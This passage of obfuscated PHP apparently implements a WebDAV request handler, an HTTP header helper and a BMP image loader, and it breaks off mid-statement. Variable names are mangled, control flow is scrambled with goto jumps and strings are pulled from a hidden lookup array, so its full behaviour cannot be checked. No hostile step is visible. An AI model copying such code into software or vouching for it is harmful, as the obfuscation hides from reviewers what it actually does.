$F½Úƒ–«²‚ = array($CÌîŠÍ¡Õ[73], $CÌîŠÍ¡Õ[74], $CÌîŠÍ¡Õ[1771]); goto D÷ÊºáŸ„ø; C‰İ¬¤Ç‰½: return $bªµãáµÎÎ; goto EĞÁ¾ÕÌŸÂ; D÷ÊºáŸ„ø: $bªµãáµÎÎ = array(); foreach ($f±‰â•ë¼Ë as $eËÉÄó–«ã => $e‘Ôâ¹˜ÃÅ) { if (!in_array($eËÉÄó–«ã, $F½Úƒ–«²‚) || !is_array($e‘Ôâ¹˜ÃÅ)) { continue; } $bªµãáµÎÎ = array_merge($bªµãáµÎÎ, $e‘Ôâ¹˜ÃÅ); } foreach ($bªµãáµÎÎ as &$e‰Ã†£·İ) { $e‰Ã†£·İ[$CÌîŠÍ¡Õ[28]] = str_replace($CÌîŠÍ¡Õ[8], $CÌîŠÍ¡Õ[1369], $e‰Ã†£·İ[$CÌîŠÍ¡Õ[28]]); } goto C‰İ¬¤Ç‰½; EĞÁ¾ÕÌŸÂ: } public function httpPROPFIND() { goto CÆÓÂ‹†å°; CÆÓÂ‹†å°: $EŒó†¡â =& $_SERVER[Äº¡•ô™Ÿ]; $dã¹Ï—Óò™ = $this->pathList($this->path); $dêéâôˆç = $this->pathListMerge($dã¹Ï—Óò™); goto A‡‡ò«êŞ„; A‡‡ò«êŞ„: $bŸ›óá¨ùæ = $dã¹Ï—Óò™[$EŒó†¡â[1772]]; if (!is_array($dêéâôˆç) || $bŸ›óá¨ùæ[$EŒó†¡â[1773]] === !1) { return array($EŒó†¡â[1774] => 404, $EŒó†¡â[1775] => $EŒó†¡â[1776]); } $e©ò¶¼›§ = $bŸ›óá¨ùæ[$EŒó†¡â[29]] == $EŒó†¡â[164] || HttpHeader::get($EŒó†¡â[1751]) == $EŒó†¡â[464]; goto F¦©«Ü‘Òô; Aöñ¢Õù°: return array($EŒó†¡â[1774] => 207, $EŒó†¡â[1775] => "\74\104\x3a\155\x75\x6c\164\x69\x73\164\x61\x74\165\x73\x20\170\155\154\156\x73\x3a\x44\75\42\104\101\126\x3a\x22\76\12{$F¶‰ËĞŸ³Ì}\xa\74\57\x44\72\155\x75\x6c\164\x69\163\164\x61\x74\x75\163\76"); goto B‡ÚßÑĞâÜ; F¦©«Ü‘Òô: if ($e©ò¶¼›§) { $dêéâôˆç = array($bŸ›óá¨ùæ); } else { $bŸ›óá¨ùæ[$EŒó†¡â[28]] = $EŒó†¡â[33]; $dêéâôˆç = array_merge(array($bŸ›óá¨ùæ), $dêéâôˆç); } $F¶‰ËĞŸ³Ì = $EŒó†¡â[33]; foreach ($dêéâôˆç as $F¨—Š‘Šİ…) { $F¶‰ËĞŸ³Ì .= $this->parseItemXml($F¨—Š‘Šİ…, $e©ò¶¼›§); } goto Aöñ¢Õù°; B‡ÚßÑĞâÜ: } public function httpHEAD() { $BäˆÍ¼¼Ô» =& $_SERVER[Äº¡•ô™Ÿ]; $F„ˆÛÏøîá = $this->pathInfo($this->path); if (!$F„ˆÛÏøîá || $F„ˆÛÏøîá[$BäˆÍ¼¼Ô»[29]] == $BäˆÍ¼¼Ô»[76]) { return array($BäˆÍ¼¼Ô»[1032] => 200, $BäˆÍ¼¼Ô»[1199] => array($BäˆÍ¼¼Ô»[1777])); } return array($BäˆÍ¼¼Ô»[1032] => 200, $BäˆÍ¼¼Ô»[1199] => array($BäˆÍ¼¼Ô»[1778], $BäˆÍ¼¼Ô»[136], $BäˆÍ¼¼Ô»[1779] . $F„ˆÛÏøîá[$BäˆÍ¼¼Ô»[77]], $BäˆÍ¼¼Ô»[1780] . get_file_mime($F„ˆÛÏøîá[$BäˆÍ¼¼Ô»[157]]), $BäˆÍ¼¼Ô»[132] . gmdate($BäˆÍ¼¼Ô»[1766], $F„ˆÛÏøîá[$BäˆÍ¼¼Ô»[1248]]) . $BäˆÍ¼¼Ô»[1781], $BäˆÍ¼¼Ô»[1782])); } public function httpOPTIONS() { $A…³É¬¢‡š =& $_SERVER[Äº¡•ô™Ÿ]; return array($A…³É¬¢‡š[1032] => 200, $A…³É¬¢‡š[1199] => array($A…³É¬¢‡š[1783], $A…³É¬¢‡š[1784], $A…³É¬¢‡š[1785], $A…³É¬¢‡š[1257])); } public function httpPROPPATCH() { $F¹§–ÅòŞ© =& $_SERVER[Äº¡•ô™Ÿ]; $E¥ö¦ÜŒ‹ = $F¹§–ÅòŞ©[1786] . $_SERVER[$F¹§–ÅòŞ©[1367]] . $F¹§–ÅòŞ©[1787]; return array($F¹§–ÅòŞ©[1774] => 207, $F¹§–ÅòŞ©[1775] => "\x3c\x44\72\155\x75\x6c\x74\x69\163\164\141\164\165\x73\40\x78\x6d\x6c\x6e\x73\x3a\x44\x3d\42\104\x41\x56\72\x22\x3e\12{$E¥ö¦ÜŒ‹}\12\74\57\x44\x3a\x6d\165\x6c\164\x69\163\x74\141\164\x75\163\x3e"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $e•ÌÌàŒ¤ =& $_SERVER[Äº¡•ô™Ÿ]; $E±ÅÄÜì = $this->uploadFile(); if ($E±ÅÄÜì) { $E•›ÔßÍÒ— = 204; } else { $E±ÅÄÜì = $e•ÌÌàŒ¤[33]; $E•›ÔßÍÒ— = 201; } $D„«» ¶ä = $this->pathPut($this->path, $E±ÅÄÜì); if ($D„«» ¶ä == !1) { $E•›ÔßÍÒ— = 404; } return array($e•ÌÌàŒ¤[1774] => $E•›ÔßÍÒ—); } private function uploadFile() { goto DÜç¬µ‘–±; cä“á¯£•¬: $b‡Óµª´³ä = @fopen($CŞè¦ÀÇĞ‚, $bŸÆÉˆæ—à[1496]); $D­½ÌÌ•å¼ = @fopen($bŸÆÉˆæ—à[1789], $bŸÆÉˆæ—à[1495]); if (!$D­½ÌÌ•å¼ || !$b‡Óµª´³ä) { @unlink($CŞè¦ÀÇĞ‚); return !1; } goto aÉŠ³ôˆÆÓ; F«»ÙñØ„: if (@filesize($CŞè¦ÀÇĞ‚) > 0) { return $CŞè¦ÀÇĞ‚; } @unlink($CŞè¦ÀÇĞ‚); return !1; goto b­‚ëˆ¹‚; DÜç¬µ‘–±: $bŸÆÉˆæ—à =& $_SERVER[Äº¡•ô™Ÿ]; @mk_dir(TEMP_FILES); $CŞè¦ÀÇĞ‚ = TEMP_FILES . $bŸÆÉˆæ—à[1788] . rand_string(32); goto cä“á¯£•¬; aÉŠ³ôˆÆÓ: while (!feof($D­½ÌÌ•å¼)) { fwrite($b‡Óµª´³ä, fread($D­½ÌÌ•å¼, 1024 * 200)); } fclose($D­½ÌÌ•å¼); fclose($b‡Óµª´³ä); goto F«»ÙñØ„; b­‚ëˆ¹‚: } public function httpMKCOL() { $cô§ÛáÑ™ =& $_SERVER[Äº¡•ô™Ÿ]; if ($this->pathExists($this->path)) { return array($cô§ÛáÑ™[1032] => 409); } $dÇ˜ÔáÓô = $this->pathMkdir($this->path); return array($cô§ÛáÑ™[1032] => $dÇ˜ÔáÓô ? 201 : 403); } public function httpMOVE() { $fàªå­Ç£Š =& $_SERVER[Äº¡•ô™Ÿ]; $EÚáµÁ‡Ú‘ = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$fàªå­Ç£Š[1790]])) { $d“…ª¦¦Ú¿[$fàªå­Ç£Š[1791]] = $_SERVER[$fàªå­Ç£Š[1790]] == $fàªå­Ç£Š[1792]; } $e¹õ½ç¢Ÿ° = $this->pathMove($this->path, $EÚáµÁ‡Ú‘); return array($fàªå­Ç£Š[1032] => $e¹õ½ç¢Ÿ° ? 201 : 404); } public function httpCOPY() { $bÃëÖ—›Ú = $this->parsePath($this->pathGet(!0)); $CĞ‡Ÿè°™ò = $this->pathCopy($this->path, $bÃëÖ—›Ú); return array($_SERVER[Äº¡•ô™Ÿ][1032] => $CĞ‡Ÿè°™ò ? 201 : 404); } public function httpDELETE() { $Fãè‰šÕ–Ğ = $this->pathRemove($this->path); return array($_SERVER[Äº¡•ô™Ÿ][1032] => $Fãè‰šÕ–Ğ ? 200 : 503); } public function httpLOCK() { $e¢ê¦¦ =& $_SERVER[Äº¡•ô™Ÿ]; $E±§°ˆ•¢ = md5($this->path); $bÏ²õ¼Šá = $e¢ê¦¦[1793] . $this->xmlGet($e¢ê¦¦[1794]) . $e¢ê¦¦[1795] . $E±§°ˆ•¢ . $e¢ê¦¦[1796]; return array($e¢ê¦¦[1032] => 200, $e¢ê¦¦[1199] => array($e¢ê¦¦[1797] . $E±§°ˆ•¢, $e¢ê¦¦[1798]), $e¢ê¦¦[1799] => $bÏ²õ¼Šá); } public function httpUNLOCK() { return array($_SERVER[Äº¡•ô™Ÿ][1032] => 204); } public function xmlGet($f¹œİÃ²ì·) { goto Cõ÷Øç¯İ˜; BŒÉº¬ô: $B›¦ˆ„ÇÛ = array_shift(explode($Fíô¡ÈÁ”Ÿ[8], $f¹œİÃ²ì·)); $DÁ”ñ„ë = $Có–ïÈ¾‹‹->getElementsByTagNameNS($Fíô¡ÈÁ”Ÿ[1801], $B›¦ˆ„ÇÛ); if ($DÁ”ñ„ë) { return $DÁ”ñ„ë[0]->nodeValue; } goto b«†ô˜Ôõó; Cõ÷Øç¯İ˜: $Fíô¡ÈÁ”Ÿ =& $_SERVER[Äº¡•ô™Ÿ]; static $Có–ïÈ¾‹‹ = false; if (!$Có–ïÈ¾‹‹) { $b¾ù¢ç¤ŠØ = file_get_contents($Fíô¡ÈÁ”Ÿ[1800]); $Có–ïÈ¾‹‹ = new DOMDocument(); $Có–ïÈ¾‹‹->loadXML($b¾ù¢ç¤ŠØ); } goto BŒÉº¬ô; b«†ô˜Ôõó: return $Fíô¡ÈÁ”Ÿ[33]; goto aäˆœƒó¯‘; aäˆœƒó¯‘: } public static function response($fš–ˆ´É²¾) { goto f²‘¬¢ƒ¦‚; f²‘¬¢ƒ¦‚: $C¡ƒÏŠÊ¨í =& $_SERVER[Äº¡•ô™Ÿ]; $d˜’“Ÿëö = is_array($fš–ˆ´É²¾[$C¡ƒÏŠÊ¨í[1199]]) ? $fš–ˆ´É²¾[$C¡ƒÏŠÊ¨í[1199]] : array(); $d˜’“Ÿëö[] = HttpHeader::code($fš–ˆ´É²¾[$C¡ƒÏŠÊ¨í[1032]]); goto B¿¨ã£á÷¢; Aç¤›ì„¢Š: if (is_string($fš–ˆ´É²¾[$C¡ƒÏŠÊ¨í[1799]])) { header($C¡ƒÏŠÊ¨í[1802]); $f×†öšóÛÛ = $C¡ƒÏŠÊ¨í[1803] . $C¡ƒÏŠÊ¨í[214] . $fš–ˆ´É²¾[$C¡ƒÏŠÊ¨í[1799]]; echo $f×†öšóÛÛ; } goto Aˆ¥±çÙİÓ; B¿¨ã£á÷¢: $d˜’“Ÿëö[] = $C¡ƒÏŠÊ¨í[1741]; $d˜’“Ÿëö[] = $C¡ƒÏŠÊ¨í[1742]; foreach ($d˜’“Ÿëö as $eŞì—°»Ì²) { header($eŞì—°»Ì²); } goto Aç¤›ì„¢Š; Aˆ¥±çÙİÓ: } } class HttpHeader { public static $_headers = array("\110\157\163\x74" => "\110\124\124\x50\x5f\110\117\x53\x54", "\x55\x73\145\x72\x2d\x41\147\x65\x6e\164" => "\x48\x54\124\x50\x5f\125\123\x45\x52\137\101\107\105\116\124", "\x43\157\x6e\x74\x65\x6e\164\x2d\x54\171\x70\145" => "\x48\x54\124\x50\x5f\x43\117\x4e\x54\105\116\124\137\124\x59\x50\x45", "\103\157\156\164\x65\x6e\164\55\x4c\x65\156\147\164\150" => "\110\124\124\120\x5f\x43\117\x4e\124\x45\x4e\124\x5f\x4c\x45\116\x47\x54\x48", "\x44\x65\x70\164\150" => "\110\x54\x54\120\137\104\x45\120\x54\x48", "\x45\170\160\x65\143\x74" => "\x48\x54\x54\x50\x5f\x45\130\120\105\x43\x54", "\x49\x66\x2d\x4e\x6f\156\x65\x2d\x4d\141\164\143\x68" => "\110\124\x54\x50\x5f\111\106\x5f\x4e\117\x4e\x45\x5f\115\x41\x54\103\x48", "\111\146\x2d\x4d\x61\x74\x63\x68" => "\110\x54\x54\x50\x5f\x49\x46\137\115\x41\124\103\x48", "\x49\146\x2d\x52\x61\x6e\147\x65" => "\x48\124\x54\x50\137\x49\x46\x5f\122\x41\x4e\x47\105", "\x4c\x61\x73\x74\55\115\x6f\144\x69\146\151\x65\144" => "\x48\x54\x54\120\x5f\114\x41\x53\124\137\x4d\x4f\x44\x49\106\x49\x45\104", "\111\146\55\115\x6f\144\151\146\151\145\144\55\123\151\156\x63\145" => "\x48\124\x54\x50\x5f\111\106\137\115\117\x44\x49\x46\111\105\x44\137\x53\x49\116\x43\x45", "\111\146\55\x55\156\155\157\144\x69\146\x69\145\144\55\x53\151\156\x63\145" => "\110\124\124\120\x5f\x49\106\x5f\x55\x4e\x4d\117\x44\111\106\111\x45\x44\137\123\x49\x4e\103\105", "\122\141\x6e\147\x65" => "\x48\x54\x54\120\x5f\122\101\116\107\105", "\x54\x69\x6d\x65\x6f\165\164" => "\110\x54\x54\x50\137\124\x49\x4d\105\x4f\125\124", "\111\146" => "\x48\x54\124\120\x5f\x49\106", "\114\157\x63\153\55\x54\157\x6b\145\156" => "\110\124\124\120\x5f\x4c\x4f\x43\x4b\137\124\117\113\x45\x4e", "\x4f\x76\145\x72\x77\162\x69\x74\x65" => "\110\x54\124\120\x5f\117\126\105\x52\127\x52\x49\124\105", "\104\x65\163\x74\x69\x6e\141\164\151\157\x6e" => "\110\124\x54\x50\137\x44\105\x53\x54\111\x4e\101\124\111\x4f\116", "\x52\145\161\x75\145\x73\164\55\111\x64" => "\x52\105\121\x55\105\x53\124\137\111\104", "\x52\x65\161\165\145\x73\x74\x2d\x42\x6f\144\x79\55\106\151\x6c\145" => "\x52\105\121\x55\x45\123\124\x5f\102\117\104\x59\x5f\106\x49\x4c\105", "\x52\x65\144\151\x72\145\x63\164\x2d\x53\x74\141\164\x75\x73" => "\122\105\104\111\122\x45\103\x54\137\123\124\x41\x54\125\x53"); public static function init() { static $aí•­Ã¶ = false; if ($aí•­Ã¶) { return; } foreach ($_SERVER as $aÃ’»†ø¢ => $c–ˆ£©Å©Î) { $aÃ’»†ø¢ = strtoupper($aÃ’»†ø¢); if (!array_key_exists($aÃ’»†ø¢, $_SERVER)) { continue; } $_SERVER[$aÃ’»†ø¢] = $c–ˆ£©Å©Î; } foreach (self::$_headers as $aÃ’»†ø¢ => $eˆ¢øğåè) { if (!array_key_exists($aÃ’»†ø¢, $_SERVER)) { continue; } $_SERVER[$aÃ’»†ø¢] = $_SERVER[$eˆ¢øğåè]; $_SERVER[strtoupper($aÃ’»†ø¢)] = $_SERVER[$eˆ¢øğåè]; } } public static function get($E˜±ÙŠè…ì) { self::init(); return $_SERVER[$E˜±ÙŠè…ì] ? $_SERVER[$E˜±ÙŠè…ì] : $_SERVER[$_SERVER[Äº¡•ô™Ÿ][1804] . strtoupper($E˜±ÙŠè…ì)]; } public static function method() { return strtoupper(self::get($_SERVER[Äº¡•ô™Ÿ][151])); } public static function length() { $dµØƒİŒÚÛ =& $_SERVER[Äº¡•ô™Ÿ]; $fñˆËŞ¡µÜ = self::get($dµØƒİŒÚÛ[1805]); if (!$fñˆËŞ¡µÜ) { $fñˆËŞ¡µÜ = self::get($dµØƒİŒÚÛ[1138]); } return $fñˆËŞ¡µÜ; } public static function range() { $eùÀÏ¹¬İ¥ =& $_SERVER[Äº¡•ô™Ÿ]; $bÓ‹œ¹ù‹Ï = self::get($eùÀÏ¹¬İ¥[195]); if (!$bÓ‹œ¹ù‹Ï) { return !1; } if (!preg_match($eùÀÏ¹¬İ¥[1806], $bÓ‹œ¹ù‹Ï, $EÄ÷¦ŒİŞ)) { return !1; } if ($EÄ÷¦ŒİŞ[1] === $eùÀÏ¹¬İ¥[33] && $EÄ÷¦ŒİŞ[2] === $eùÀÏ¹¬İ¥[33]) { return !1; } return array($EÄ÷¦ŒİŞ[1] !== $eùÀÏ¹¬İ¥[33] ? $EÄ÷¦ŒİŞ[1] : null, $EÄ÷¦ŒİŞ[2] !== $eùÀÏ¹¬İ¥[33] ? $EÄ÷¦ŒİŞ[2] : null); } public static $statusCode = array("\x31\x30\x30" => "\103\157\156\164\x69\x6e\165\145", "\61\60\61" => "\x53\167\151\x74\x63\150\151\156\x67\40\x50\x72\157\164\157\143\x6f\x6c", "\61\60\x32" => "\120\162\x6f\x63\145\163\163\x69\x6e\147", "\61\60\x33" => "\x45\x61\x72\x6c\x79\x20\110\151\x6e\x74\x73", "\62\x30\x30" => "\117\113", "\x32\60\x31" => "\x43\162\145\141\x74\145\144", "\62\x30\x32" => "\x41\x63\143\x65\160\x74\145\144", "\x32\x30\63" => "\116\157\x6e\x2d\101\165\x74\150\x6f\162\x69\164\x61\x74\x69\166\145\x20\x49\156\146\x6f\x72\x6d\x61\164\151\157\x6e", "\62\x30\x34" => "\x4e\x6f\40\x43\x6f\x6e\164\145\156\x74", "\x32\x30\x35" => "\x52\145\x73\145\164\x20\103\x6f\x6e\164\145\156\x74", "\x32\60\66" => "\x50\x61\162\164\151\x61\154\40\103\x6f\156\x74\145\x6e\x74", "\62\x30\x37" => "\115\165\x6c\164\151\x2d\x53\164\x61\164\x75\x73", "\x33\60\x30" => "\115\x75\x6c\x74\151\x70\154\145\x20\103\x68\x6f\151\143\x65\x73", "\x33\x30\x31" => "\115\157\166\x65\x64\40\120\145\x72\x6d\141\156\x65\156\x74\154\x79", "\x33\x30\x32" => "\x46\x6f\165\x6e\x64", "\x33\x30\63" => "\123\x65\145\40\x4f\164\x68\x65\162", "\63\x30\x34" => "\x4e\x6f\x74\40\x4d\157\144\x69\x66\x69\145\x64", "\63\x30\x35" => "\125\163\145\40\x50\162\157\170\x79", "\x33\60\67" => "\x54\x65\x6d\x70\157\162\141\x72\x79\x20\122\x65\144\151\162\x65\143\x74", "\x33\x30\x38" => "\120\145\x72\155\141\156\x65\x6e\164\x20\122\x65\144\x69\x72\x65\143\x74", "\x34\60\60" => "\x42\141\144\40\x52\145\x71\165\145\163\164", "\x34\x30\61" => "\125\x6e\x61\x75\x74\150\157\x72\x69\172\x65\x64", "\x34\60\62" => "\120\141\x79\x6d\x65\156\x74\x20\x52\145\x71\x75\151\x72\145\144", "\x34\x30\x33" => "\106\x6f\162\x62\151\x64\x64\x65\156", "\64\60\x34" => "\116\x6f\164\x20\x46\157\165\x6e\x64", "\x34\60\65" => "\115\145\x74\150\x6f\144\40\116\157\x74\40\x41\x6c\154\x6f\x77\x65\x64", "\64\60\66" => "\x4e\x6f\164\40\101\143\x63\x65\160\164\141\142\154\x65", "\64\60\x37" => "\x50\x72\x6f\x78\171\x20\x41\x75\164\150\x65\156\164\x69\x63\x61\164\x69\157\156\40\122\145\161\165\151\162\145\x64", "\x34\x30\x38" => "\x52\145\161\x75\145\163\164\40\x54\x69\x6d\x65\x6f\x75\164", "\x34\60\x39" => "\x43\157\156\146\154\151\x63\164", "\64\x31\60" => "\x47\x6f\156\145", "\x34\x31\61" => "\x4c\145\156\147\164\x68\40\x52\x65\161\165\151\x72\x65\x64", "\x34\61\62" => "\x50\x72\145\x63\157\x6e\x64\x69\164\x69\157\x6e\x20\x46\x61\x69\x6c\145\144", "\64\61\63" => "\122\145\x71\165\145\x73\x74\40\105\156\x74\x69\164\171\40\x54\x6f\157\x20\114\141\x72\147\145", "\x34\61\64" => "\x52\145\x71\165\x65\x73\164\40\125\x52\x49\40\x54\x6f\x6f\x20\114\x61\x72\147\x65", "\64\61\65" => "\125\x6e\163\x75\160\160\157\x72\x74\x65\x64\x20\115\145\144\x69\141\x20\124\171\x70\145", "\64\61\66" => "\122\x65\x71\165\x65\x73\164\145\x64\x20\x52\141\x6e\x67\145\x20\116\157\164\40\123\x61\164\x69\x73\146\x69\x61\142\154\x65", "\x34\x31\67" => "\105\170\x70\x65\x63\x74\141\164\151\x6f\x6e\x20\x46\141\x69\154\x65\144", "\x34\62\x32" => "\x55\156\x70\162\x6f\143\x65\x73\163\141\x62\154\x65\40\105\156\164\x69\x74\x79", "\x34\62\63" => "\x4c\157\x63\153\x65\144", "\64\x32\64" => "\x46\141\x69\154\x65\144\40\x44\x65\x70\x65\156\144\145\156\143\x79", "\x34\x32\x35" => "\125\156\157\162\x64\145\162\145\x64\40\x43\x6f\x6c\154\x65\143\x74\x69\157\156", "\x34\x32\66" => "\125\x70\x67\162\x61\144\x65\40\x52\145\x71\x75\151\x72\x65\144", "\x34\62\x38" => "\120\x72\x65\x63\x6f\156\144\151\x74\x69\x6f\x6e\40\x52\x65\x71\165\x69\162\145\x64", "\x34\x32\71" => "\124\157\157\x20\115\141\x6e\171\40\x52\145\161\x75\x65\163\x74\163", "\64\x33\61" => "\x52\145\x71\165\145\163\164\x20\110\x65\141\x64\x65\x72\40\106\x69\145\154\144\163\x20\124\157\x6f\40\114\x61\x72\147\x65", "\x34\64\x34" => "\x4e\157\x20\x52\145\x73\x70\x6f\x6e\163\145", "\64\65\x30" => "\x42\x6c\x6f\x63\153\145\x64\x20\142\171\x20\127\x69\x6e\x64\157\167\x73\40\120\141\162\x65\156\164\x61\154\x20\103\157\x6e\164\x72\x6f\x6c\x73", "\x34\65\61" => "\x55\156\x61\x76\x61\x69\x6c\x61\142\x6c\145\x20\106\x6f\162\40\x4c\x65\x67\141\154\x20\122\x65\141\x73\157\156\163", "\x34\x39\64" => "\x52\x65\x71\x75\145\x73\164\40\x48\x65\x61\x64\x65\162\x20\x54\x6f\x6f\40\x4c\x61\x72\147\x65", "\65\60\60" => "\111\156\x74\145\x72\156\141\154\40\123\x65\162\166\145\x72\x20\105\x72\162\157\162", "\x35\60\x31" => "\116\157\164\40\111\155\x70\x6c\x65\155\x65\156\x74\145\x64", "\x35\x30\62" => "\x42\x61\144\40\107\141\164\x65\167\141\171", "\x35\60\63" => "\x53\x65\x72\x76\x69\143\145\40\125\x6e\x61\x76\x61\x69\x6c\141\142\x6c\145", "\x35\x30\x34" => "\107\x61\164\145\x77\x61\171\40\x54\151\x6d\145\x6f\165\x74", "\x35\x30\65" => "\110\x54\x54\120\40\126\x65\162\163\x69\157\x6e\40\x6e\x6f\x74\x20\163\165\x70\x70\157\162\x74\145\x64", "\x35\60\x37" => "\111\156\x73\x75\146\x66\x69\143\x69\x65\156\164\40\x53\x74\157\162\x61\x67\x65"); public static function code($BØõÄã®­Ï) { $bğË‡„„İÖ =& $_SERVER[Äº¡•ô™Ÿ]; $BØõÄã®­Ï = $BØõÄã®­Ï . $bğË‡„„İÖ[33]; $fÊëõïñ = self::$statusCode[$BØõÄã®­Ï]; $fÊëõïñ = $fÊëõïñ ? "\110\x54\124\120\57\x31\x2e\x31\40{$BØõÄã®­Ï}\x20" . $fÊëõïñ : $bğË‡„„İÖ[33]; return $fÊëõïñ; } } class ImageGdBMP { public static function load($f‡–³ß“àİ) { $A†‡¤“Û…‚ = fopen($f‡–³ß“àİ, $_SERVER[Äº¡•ô™Ÿ][1495]); if ($A†‡¤“Û…‚ === !1) { return !1; } $E§ˆôƒèùğ = self::loadFromStream($A†‡¤“Û…‚); fclose($A†‡¤“Û…‚); return $E§ˆôƒèùğ; } public static function loadFromStream($fŠò£ ¨¾ë) { $aÈƒÍÛ¾‚ =& $_SERVER[Äº¡•ô™Ÿ]; $CÑ¼©øØÚ× = fread($fŠò£ ¨¾ë, 14); if ($CÑ¼©øØÚ× === !1) { return !1; } if ($CÑ¼©øØÚ×[0] != $aÈƒÍÛ¾‚[1807] || $CÑ¼©øØÚ×[1] != $aÈƒÍÛ¾‚[1808]) { return !1; } $dĞªçîÚ¦´ = unpack($aÈƒÍÛ¾‚[1809] . $aÈƒÍÛ¾‚[1810] . $aÈƒÍÛ¾‚[1811] . $aÈƒÍÛ¾‚[1812] . $aÈƒÍÛ¾‚[1813], $CÑ¼©øØÚ×); return self::loadFromStreamAndFileHeader($fŠò£ ¨¾ë, $dĞªçîÚ¦´); } public static function loadFromStreamAndFileHeader($d¬ÆŒÏµŠ‹, array $D˜÷Óáù—) { goto d ¨ãÈâ¯ù; EïáğÎ…Çñ: if ($FÀèÙóã™‡ == 0 || $B¤ÓÂåŠ¯Ú == 0 || $FĞŒ²Ùø† != 1 || ($d‘İ¾­ğá™ & $BÉà•£È¸) != 0 || ($d‘İ¾­ğá™ & $E»…ã¶•½) != 0 || ($d‘İ¾­ğá™ & $D™©œ“Ç) != 0 || ($BÉà•£È¸ & $E»…ã¶•½) != 0 || ($BÉà•£È¸ & $D™©œ“Ç) != 0 || ($E»…ã¶•½ & $D™©œ“Ç) != 0) { return !1; } if ($b»‡‘ó·˜ == 4 || $b»‡‘ó·˜ == 5) { $dÙîŠÌ·“‹ = stream_get_contents($d¬ÆŒÏµŠ‹, $Bğ¹ÅË…õ¸); if ($dÙîŠÌ·“‹ === !1) { return !1; } return imagecreatefromstring($dÙîŠÌ·“‹); } $eÈ¾³¿˜Ï = $FÀèÙóã™‡ * $CÊ„¸çÌØ + 31 >> 3 & ~3; goto cù‘‚Œ¨ÈÉ; cù‘‚Œ¨ÈÉ: $E¶½«‰â Æ = abs($B¤ÓÂåŠ¯Ú); $bÓ›Ãö¹ = $B¤ÓÂåŠ¯Ú > 0 ? $E¶½«‰â Æ - 1 : 0; $b£­ÅÀ×Ï˜ = $B¤ÓÂåŠ¯Ú > 0 ? -1 : 1; goto cÃĞ‹©äÚÂ; d ¨ãÈâ¯ù: $b‡ÒŒºËğ¸ =& $_SERVER[Äº¡•ô™Ÿ]; if ($D˜÷Óáù—[$b‡ÒŒºËğ¸[385]] != 19778) { return !1; } $dÙîŠÌ·“‹ = fread($d¬ÆŒÏµŠ‹, 4); goto F³Œİå¡¾; cÃĞ‹©äÚÂ: if ($CÊ„¸çÌØ == 1 || $CÊ„¸çÌØ == 4 || $CÊ„¸çÌØ == 8) { goto E—Á¾†ËŸñ; E—Á¾†ËŸñ: $fòîšëï÷ = imagecreate($FÀèÙóã™‡, $E¶½«‰â Æ); $FºæÂäÌ‰“ = $b¨¡·Îàã == 12 ? 3 : 4; $F·îø«º²« = $eÀØÕÉŞŒ ? $eÀØÕÉŞŒ : pow(2, $CÊ„¸çÌØ); goto F”½õÁ¶ƒö; e­¦ŒÜ: $CÓ¨¶¶•š‚ = (1 << $CÊ„¸çÌØ) - 1 << $DáÛŒœ¾Ú; if ($b»‡‘ó·˜ == 1 || $b»‡‘ó·˜ == 2) { $c·™Î–† = 0; $EÙ’ŸšºëÍ = $CÊ„¸çÌØ >> 2 & 1; for (;;) { if ($c·™Î–† < -1 || $c·™Î–† > $FÀèÙóã™‡ || $bÓ›Ãö¹ < -1 || $bÓ›Ãö¹ > $B¤ÓÂåŠ¯Ú) { imagedestroy($fòîšëï÷); return !1; } $dÙîŠÌ·“‹ = fread($d¬ÆŒÏµŠ‹, 1); if ($dÙîŠÌ·“‹ === !1) { imagedestroy($fòîšëï÷); return !1; } switch ($dÙîŠÌ·“‹) { case $b‡ÒŒºËğ¸[1832]: $dÙîŠÌ·“‹ = fread($d¬ÆŒÏµŠ‹, 1); if ($dÙîŠÌ·“‹ === !1) { imagedestroy($fòîšëï÷); return !1; } switch ($dÙîŠÌ·“‹) { case $b‡ÒŒºËğ¸[1832]: $bÓ›Ãö¹ += $b£­ÅÀ×Ï˜; $c·™Î–† = 0; break; case $b‡ÒŒºËğ¸[1834]: $bÓ›Ãö¹ = 0; $c·™Î–† = 0; break 3; case $b‡ÒŒºËğ¸[1835]: $dÙîŠÌ·“‹ = fread($d¬ÆŒÏµŠ‹, 2); if ($dÙîŠÌ·“‹ === !1) { imagedestroy($fòîšëï÷); return !1; } list(, $B“Ï¿ä‡¹, $aææöõ®¼Œ) = unpack($b‡ÒŒºËğ¸[1836], $dÙîŠÌ·“‹); $c·™Î–† += $B“Ï¿ä‡¹; $bÓ›Ãö¹ += $aææöõ®¼Œ * $b£­ÅÀ×Ï˜; break; default: list(, $CÊÁÃ•˜°) = unpack($b‡ÒŒºËğ¸[1837], $dÙîŠÌ·“‹); $b ¾×æÉø = ($CÊÁÃ•˜° >> $EÙ’ŸšºëÍ) + ($CÊÁÃ•˜° & $EÙ’ŸšºëÍ); $dÙîŠÌ·“‹ = fread($d¬ÆŒÏµŠ‹, $b ¾×æÉø + 1 & ~1); if ($dÙîŠÌ·“‹ === !1) { imagedestroy($fòîšëï÷); return !1; } for ($e·¼Ô¶“¬× = 0, $cŸ•ŒõÃ×Œ = 0; $e·¼Ô¶“¬× < $CÊÁÃ•˜°; ++$e·¼Ô¶“¬×, ++$c·™Î–†, $cŸ•ŒõÃ×Œ += $CÊ„¸çÌØ) { list(, $açœ‡¸®´Î) = unpack($b‡ÒŒºËğ¸[1837], $dÙîŠÌ·“‹[$cŸ•ŒõÃ×Œ >> 3]); $bÈ´ôª»Øò = $cŸ•ŒõÃ×Œ & 7; imagesetpixel($fòîšëï÷, $c·™Î–†, $bÓ›Ãö¹, $Eô†¦ƒ…µ¿[($açœ‡¸®´Î & $CÓ¨¶¶•š‚ >> $bÈ´ôª»Øò) >> $DáÛŒœ¾Ú - $bÈ´ôª»Øò]); } break; } break; default: $Fá¡ÆòÕ‡ = fread($d¬ÆŒÏµŠ‹, 1); if ($Fá¡ÆòÕ‡ === !1) { imagedestroy($fòîšëï÷); return !1; } list(, $cìóùíŒß–, $açœ‡¸®´Î) = unpack($b‡ÒŒºËğ¸[1836], $dÙîŠÌ·“‹ . $Fá¡ÆòÕ‡); for ($e·¼Ô¶“¬× = 0, $cŸ•ŒõÃ×Œ = 0; $e·¼Ô¶“¬× < $cìóùíŒß–; ++$e·¼Ô¶“¬×, ++$c·™Î–†, $cŸ•ŒõÃ×Œ += $CÊ„¸çÌØ) { $bÈ´ôª»Øò = $cŸ•ŒõÃ×Œ & 7; imagesetpixel($fòîšëï÷, 